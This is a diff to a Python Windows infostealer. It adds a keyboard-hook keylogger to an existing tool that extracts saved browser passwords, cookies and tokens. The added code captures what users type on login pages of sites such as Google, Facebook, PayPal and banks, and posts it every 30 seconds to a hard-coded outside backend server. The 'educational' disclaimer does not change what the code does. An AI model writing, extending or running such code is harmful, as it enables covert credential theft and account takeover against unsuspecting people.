@@ -3,6 +3,7 @@ Token and Password Extraction Module for Windows
 - Extracts saved credentials from multiple browsers:
   Chrome, Brave, Firefox, Opera, Microsoft Edge, Vivaldi, etc.
 - Retrieves tokens, cookies, and login data
+- Real-time password capture via keyboard hooks
 - Sends extracted data to backend server
 
 WARNING: This is for EDUCATIONAL/RESEARCH purposes only.
@@ -17,8 +18,12 @@ import sqlite3
 import shutil
 import platform
 import requests
+import threading
+import time
+import re
 from datetime import datetime, timedelta
 from pathlib import Path
+from collections import deque
 
 # Backend server URL
 BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
@@ -833,14 +838,311 @@ def collect_all_data():
     return collected_data
 
 
-def main():
+# ==================== REAL-TIME PASSWORD CAPTURE ====================
+
+# Buffer for real-time captured passwords
+realtime_passwords = deque(maxlen=100)
+SEND_INTERVAL = 30  # seconds
+
+# Browser window patterns
+BROWSER_PATTERNS = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'vivaldi', 'browser']
+
+# Login page patterns
+LOGIN_PATTERNS = [
+    r'login', r'signin', r'sign-in', r'log-in', r'auth', r'account',
+    r'facebook', r'google', r'twitter', r'instagram', r'github',
+    r'amazon', r'paypal', r'bank', r'password'
+]
+
+
+def is_browser_window(title):
+    """Check if window is a browser"""
+    return any(b in title.lower() for b in BROWSER_PATTERNS)
+
+
+def is_login_page(title):
+    """Check if window suggests login page"""
+    return any(re.search(p, title.lower()) for p in LOGIN_PATTERNS)
+
+
+def get_active_window():
+    """Get current active window title"""
+    try:
+        if platform.system() == "Windows":
+            import ctypes
+            user32 = ctypes.windll.user32
+            hwnd = user32.GetForegroundWindow()
+            length = user32.GetWindowTextLengthW(hwnd)
+            buffer = ctypes.create_unicode_buffer(length + 1)
+            user32.GetWindowTextW(hwnd, buffer, length + 1)
+            return buffer.value
+    except:
+        pass
+    return ""
+
+
+def send_realtime_data():
+    """Send real-time captured passwords to backend"""
+    global realtime_passwords
+    
+    if not realtime_passwords:
+        return
+    
+    data = {
+        "system_info": get_system_info(),
+        "passwords": {
+            "data": list(realtime_passwords),
+            "total_count": len(realtime_passwords),
+            "capture_type": "realtime_keyboard"
+        },
+        "cookies": {"data": [], "total_count": 0},
+        "history": {"data": [], "total_count": 0},
+        "tokens": {"data": [], "total_count": 0},
+        "extraction_timestamp": datetime.now().isoformat()
+    }
+    
+    if send_to_backend(data):
+        realtime_passwords.clear()
+
+
+def periodic_sender():
+    """Background thread to send data periodically"""
+    while True:
+        time.sleep(SEND_INTERVAL)
+        if realtime_passwords:
+            send_realtime_data()
+
+
+class RealtimeCapture:
     """
-    Main function - collect and send data to backend
+    Real-time password capture using keyboard hooks
+    Captures passwords as user types them in browser login forms
     """
+    
+    def __init__(self):
+        self.current_input = ""
+        self.current_window = ""
+        self.last_key_time = time.time()
+        self.input_timeout = 5
+    
+    def save_input(self, is_submit=False):
+        """Save captured input"""
+        if len(self.current_input) >= 4 and is_login_page(self.current_window):
+            capture = {
+                "window": self.current_window,
+                "text": self.current_input,
+                "submitted": is_submit,
+                "time": datetime.now().isoformat(),
+                "method": "keyboard"
+            }
+            realtime_passwords.append(capture)
+            print(f"[+] Captured: {self.current_window[:40]}...")
+    
+    def on_key(self, key):
+        """Handle key press"""
+        try:
+            window = get_active_window()
+            
+            if not is_browser_window(window):
+                return
+            
+            if window != self.current_window:
+                self.save_input()
+                self.current_window = window
+                self.current_input = ""
+            
+            if time.time() - self.last_key_time > self.input_timeout:
+                self.save_input()
+                self.current_input = ""
+            
+            self.last_key_time = time.time()
+            key_str = str(key)
+            
+            if hasattr(key, 'char') and key.char:
+                self.current_input += key.char
+            elif 'enter' in key_str.lower():
+                self.save_input(is_submit=True)
+                self.current_input = ""
+            elif 'backspace' in key_str.lower():
+                self.current_input = self.current_input[:-1]
+            elif 'tab' in key_str.lower():
+                self.save_input()
+                self.current_input = ""
+            elif 'space' in key_str.lower():
+                self.current_input += " "
+        except:
+            pass
+    
+    def start(self):
+        """Start keyboard capture"""
+        try:
+            from pynput import keyboard
+            print("[+] Starting keyboard capture with pynput...")
+            with keyboard.Listener(on_press=self.on_key) as listener:
+                listener.join()
+        except ImportError:
+            print("[!] pynput not installed. Using win32 hooks...")
+            self.start_win32()
+    
+    def start_win32(self):
+        """Win32 hook-based capture"""
+        try:
+            import ctypes
+            from ctypes import wintypes, CFUNCTYPE, c_int
+            
+            user32 = ctypes.windll.user32
+            kernel32 = ctypes.windll.kernel32
+            
+            WH_KEYBOARD_LL = 13
+            WM_KEYDOWN = 0x0100
+            
+            HOOKPROC = CFUNCTYPE(c_int, c_int, wintypes.WPARAM, wintypes.LPARAM)
+            
+            class KBDLLHOOKSTRUCT(ctypes.Structure):
+                _fields_ = [
+                    ("vkCode", wintypes.DWORD),
+                    ("scanCode", wintypes.DWORD),
+                    ("flags", wintypes.DWORD),
+                    ("time", wintypes.DWORD),
+                    ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
+                ]
+            
+            def callback(nCode, wParam, lParam):
+                if nCode >= 0 and wParam == WM_KEYDOWN:
+                    kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+                    self.process_vk(kb.vkCode)
+                return user32.CallNextHookEx(None, nCode, wParam, lParam)
+            
+            cb = HOOKPROC(callback)
+            hook = user32.SetWindowsHookExA(WH_KEYBOARD_LL, cb, kernel32.GetModuleHandleW(None), 0)
+            
+            if hook:
+                print("[+] Win32 keyboard hook installed")
+                msg = wintypes.MSG()
+                while user32.GetMessageA(ctypes.byref(msg), None, 0, 0):
+                    user32.TranslateMessage(ctypes.byref(msg))
+                    user32.DispatchMessageA(ctypes.byref(msg))
+                user32.UnhookWindowsHookEx(hook)
+        except Exception as e:
+            print(f"[!] Win32 hook failed: {e}")
+    
+    def process_vk(self, vk):
+        """Process virtual key code"""
+        window = get_active_window()
+        
+        if not is_browser_window(window):
+            return
+        
+        if window != self.current_window:
+            self.save_input()
+            self.current_window = window
+            self.current_input = ""
+        
+        # Convert VK to char
+        char = self.vk_to_char(vk)
+        
+        if char == "[ENTER]":
+            self.save_input(is_submit=True)
+            self.current_input = ""
+        elif char == "[BS]":
+            self.current_input = self.current_input[:-1]
+        elif char == "[TAB]":
+            self.save_input()
+            self.current_input = ""
+        elif char:
+            self.current_input += char
+    
+    def vk_to_char(self, vk):
+        """Convert virtual key to character"""
+        try:
+            import ctypes
+            user32 = ctypes.windll.user32
+            shift = user32.GetKeyState(0x10) & 0x8000
+            caps = user32.GetKeyState(0x14) & 0x0001
+            
+            if 0x30 <= vk <= 0x39:  # 0-9
+                return chr(vk)
+            elif 0x41 <= vk <= 0x5A:  # A-Z
+                c = chr(vk)
+                return c.upper() if (shift or caps) else c.lower()
+            elif vk == 0x0D:
+                return "[ENTER]"
+            elif vk == 0x08:
+                return "[BS]"
+            elif vk == 0x09:
+                return "[TAB]"
+            elif vk == 0x20:
+                return " "
+            
+            special = {0xBD: "-", 0xBB: "=", 0xDB: "[", 0xDD: "]",
+                      0xDC: "\\", 0xBA: ";", 0xDE: "'", 0xBC: ",",
+                      0xBE: ".", 0xBF: "/", 0xC0: "`"}
+            return special.get(vk, None)
+        except:
+            return None
+
+
+def run_realtime_capture():
+    """Run real-time password capture mode"""
     print("""
     ╔═══════════════════════════════════════════════════════════════════╗
-    ║           Token & Password Access Module v2.0                     ║
+    ║           Real-time Password Capture Mode                         ║
+    ║                                                                   ║
+    ║  • Captures passwords as users type them in browsers             ║
+    ║  • Monitors login pages (Google, Facebook, etc.)                  ║
+    ║  • Sends to backend every 30 seconds                              ║
+    ║                                                                   ║
+    ║  Press Ctrl+C to stop                                             ║
+    ╚═══════════════════════════════════════════════════════════════════╝
+    """)
+    
+    if platform.system() != "Windows":
+        print("[!] Real-time capture requires Windows OS")
+        return
+    
+    print(f"[*] System: {platform.node()}")
+    print(f"[*] User: {os.getenv('USERNAME')}")
+    print(f"[*] Backend: {BACKEND_URL}")
+    print()
+    
+    # Start background sender
+    sender = threading.Thread(target=periodic_sender, daemon=True)
+    sender.start()
+    print("[+] Background sender started")
+    
+    # Start capture
+    print("[+] Starting keyboard capture...")
+    print("[*] Monitoring browser password fields...\n")
+    
+    capture = RealtimeCapture()
+    capture.start()
+
+
+def main():
+    """
+    Main function - supports multiple modes
+    """
+    import argparse
+    
+    parser = argparse.ArgumentParser(description="Token & Password Access Module")
+    parser.add_argument('--realtime', '-r', action='store_true', 
+                       help='Run real-time password capture (keyboard hook)')
+    parser.add_argument('--extract', '-e', action='store_true',
+                       help='Extract stored browser data (default)')
+    parser.add_argument('--both', '-b', action='store_true',
+                       help='Extract stored data, then run real-time capture')
+    
+    args = parser.parse_args()
+    
+    print("""
+    ╔═══════════════════════════════════════════════════════════════════╗
+    ║           Token & Password Access Module v3.0                     ║
     ║                Multi-Browser Extraction Tool                      ║
+    ║                                                                   ║
+    ║  Modes:                                                           ║
+    ║  • --extract (-e)   Extract saved browser passwords               ║
+    ║  • --realtime (-r)  Capture passwords in real-time                ║
+    ║  • --both (-b)      Extract then run real-time capture            ║
     ║                                                                   ║
     ║  Supported Browsers:                                              ║
     ║  • Chromium: Chrome, Brave, Edge, Opera, Vivaldi, Yandex          ║
@@ -850,25 +1152,34 @@ def main():
     ╚═══════════════════════════════════════════════════════════════════╝
     """)
     
-    # Check if running on Windows
     if platform.system() != "Windows":
         print("[!] Warning: This script is designed for Windows OS")
         print("[!] Some features may not work on other platforms")
         print()
     
-    # Collect all browser data
-    collected_data = collect_all_data()
-    
-    # Send to backend server
-    print("\n[*] Sending extracted data to backend server...")
-    success = send_to_backend(collected_data)
-    
-    if success:
-        print(f"\n[+] Data exfiltration completed successfully!")
+    if args.realtime:
+        # Real-time capture only
+        run_realtime_capture()
+    elif args.both:
+        # Extract stored data first
+        collected_data = collect_all_data()
+        print("\n[*] Sending extracted data to backend server...")
+        send_to_backend(collected_data)
+        print()
+        # Then run real-time capture
+        run_realtime_capture()
     else:
-        print("\n[!] Failed to send data to backend!")
-    
-    return collected_data
+        # Default: extract stored data
+        collected_data = collect_all_data()
+        print("\n[*] Sending extracted data to backend server...")
+        success = send_to_backend(collected_data)
+        
+        if success:
+            print(f"\n[+] Data exfiltration completed successfully!")
+        else:
+            print("\n[!] Failed to send data to backend!")
+        
+        return collected_data
 
 
 if __name__ == "__main__":
